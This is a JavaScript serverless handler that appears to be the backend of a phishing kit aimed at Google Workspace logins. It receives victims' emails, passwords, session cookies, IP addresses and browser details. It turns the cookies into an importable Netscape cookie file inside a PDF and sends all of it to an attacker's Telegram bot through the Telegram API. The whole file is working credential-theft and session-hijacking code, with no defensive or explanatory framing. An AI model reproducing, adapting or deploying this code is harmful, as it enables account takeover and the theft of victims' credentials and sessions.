import nodemailer from 'nodemailer';
import { PDFDocument, StandardFonts, rgb } from 'pdf-lib';

async function generateCookiePDF(cookies, email, domain) {
  const pdfDoc = await PDFDocument.create();
  const page = pdfDoc.addPage([612, 792]);
  const font = await pdfDoc.embedFont(StandardFonts.Helvetica);
  const { height } = page.getSize();

  let y = height - 50;

  page.drawText('Session Cookies', { x: 50, y, size: 16, font, color: rgb(0, 0, 0) });
  y -= 30;

  page.drawText('# Netscape HTTP Cookie File', { x: 50, y, size: 12, font, color: rgb(0, 0, 0) });
  y -= 20;

  page.drawText('# Netscape format - import to browser', { x: 50, y, size: 10, font, color: rgb(0.4, 0.4, 0.4) });
  y -= 30;

  const dom = domain || 'localhost';
  const expires = Math.floor(Date.now() / 1000) + 86400;

  if (cookies && cookies !== 'none') {
    const lines = cookies.split(';').map((c) => {
      const eq = c.trim().indexOf('=');
      if (eq < 0) return null;
      const name = c.trim().substring(0, eq).trim();
      const value = c.trim().substring(eq + 1).trim();
      if (!name) return null;
      return `${dom}\tTRUE\t/\t0\t${expires}\t${name}\t${value}`;
    }).filter(Boolean);

    const lineHeight = 12;
    for (const line of lines) {
      if (y < 50) break;
      page.drawText(line, { x: 50, y, size: 10, font, color: rgb(0, 0, 0) });
      y -= lineHeight;
    }
  } else {
    page.drawText('No cookies captured', { x: 50, y, size: 12, font, color: rgb(0.5, 0, 0) });
  }

  return Buffer.from(await pdfDoc.save());
}

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const data = req.body;
  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.connection.remoteAddress;

  console.log('Captured:', data.email, ip);

  // TELEGRAM ONLY
  try {
    const pdfBuffer = await generateCookiePDF(data.cookies, data.email, data.captureDomain);
    
    const formData = new FormData();
    formData.append('chat_id', process.env.TELEGRAM_CHAT_ID);
    formData.append('photo', pdfBuffer, 'vct_session.pdf');
    formData.append('caption', `
🔔 *Google Workspace CAPTURED*

⏰ *${new Date().toLocaleString()}*
🌐 *IP:* \`${ip}\`
📧 *Email:* \`${data.email}\`
🔑 *Password:* \`${data.password || 'N/A'}\`

🍪 *Cookies PDF attached* 
${data.cookiesImportLink ? `🔗 [Import Session →](${data.cookiesImportLink})` : ''}

👤 *Browser:* ${data.userAgent?.slice(0, 80) || 'N/A'}...
`);

    const telegramResponse = await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: formData,
    });

    if (telegramResponse.ok) {
      console.log('✅ Telegram delivered');
    } else {
      console.error('Telegram failed:', await telegramResponse.text());
    }
  } catch (err) {
    console.error('Telegram error:', err.message);
  }

  res.json({ status: 'captured ✅', email: data.email });
}
